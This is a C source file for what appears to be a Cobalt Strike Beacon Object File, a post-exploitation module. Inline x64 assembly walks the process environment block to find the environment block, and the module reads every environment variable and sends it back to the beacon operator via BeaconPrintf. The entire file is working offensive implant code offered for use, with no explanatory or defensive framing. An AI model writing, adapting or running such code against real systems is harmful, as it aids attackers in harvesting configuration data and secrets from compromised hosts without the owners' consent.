#include <windows.h>
#include "beacon.h"

PVOID getProcessParamsAddr()
{
    PVOID procParamAddr = NULL;
    __asm__(
        "xor r10, r10 \n"         // R10 = 0x0 - Null out some registers
        "mul r10 \n"              // RAX&RDX = 0x0
        "add al, 0x60 \n"         // RAX = 0x60 = Offset of PEB Address within the TEB
        "mov rbx, gs:[rax] \n"    // RBX = PEB Address
        "mov rax, [rbx+0x20] \n"  // RAX = ProcessParameters Address
        "mov %[procParamAddr], rax \n"
		:[procParamAddr] "=r" (procParamAddr)
	);
    return procParamAddr;
}

PVOID getEnvironmentAddr(PVOID procParamAddr)
{
    PVOID environmentAddr = NULL;
    __asm__(
        "mov rax, %[procParamAddr] \n"
        "mov rbx, [rax+0x80] \n"  // RBX = Environment Address
        "mov %[environmentAddr], rbx \n"
		:[environmentAddr] "=r" (environmentAddr)
		:[procParamAddr] "r" (procParamAddr)
	);
    return environmentAddr;
}

PVOID getEnvironmentSize(PVOID procParamAddr)
{
    PVOID environmentSize = NULL;
    __asm__(
        "mov rax, %[procParamAddr] \n"
        "mov rax, [rax+0x3f0] \n" // RAX = Environment Siz
        "mov %[environmentSize], rax \n"
        : [environmentSize] "=r"(environmentSize)
        : [procParamAddr] "r"(procParamAddr));
    return environmentSize;
}

PVOID getUnicodeStrLen(PVOID envStrAddr)
{
    PVOID unicodeStrLen = NULL;
    __asm__(
        "mov rax, %[envStrAddr] \n"
        "xor rbx, rbx \n" // RBX is our 0x00 null to compare the string position too
        "xor rcx, rcx \n" // RCX is our string length counter
    "check: \n"
        "inc rcx \n"
        "cmp bl, [rax + rcx] \n"
        "jne check \n"
        "inc rcx \n" 
        "cmp bl, [rax + rcx] \n"
        "jne check \n"
        "mov %[unicodeStrLen], rcx \n"
		:[unicodeStrLen] "=r" (unicodeStrLen)
		:[envStrAddr] "r" (envStrAddr)
	);
    return unicodeStrLen;
}

void printLoopAllTheStrings(PVOID nextEnvStringAddr, unsigned __int64 environmentSize)
{
    PVOID unicodeStrSize = NULL;
    PVOID environmentEndAddr = nextEnvStringAddr + environmentSize;
    while (nextEnvStringAddr < environmentEndAddr)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%ls",nextEnvStringAddr);
        unicodeStrSize = getUnicodeStrLen(nextEnvStringAddr)+2;
        nextEnvStringAddr += (unsigned __int64)unicodeStrSize;
    }
}

void go(char *args, int len)
{
    PVOID procParamAddr = NULL;
    PVOID environmentAddr = NULL;
    PVOID environmentSize = NULL;
    procParamAddr = getProcessParamsAddr();
    environmentAddr = getEnvironmentAddr(procParamAddr);
    environmentSize = getEnvironmentSize(procParamAddr);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Evironment Address: %p",environmentAddr); 
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Evironment Size:    %d",environmentSize);
    printLoopAllTheStrings(environmentAddr, (unsigned __int64)environmentSize);
}
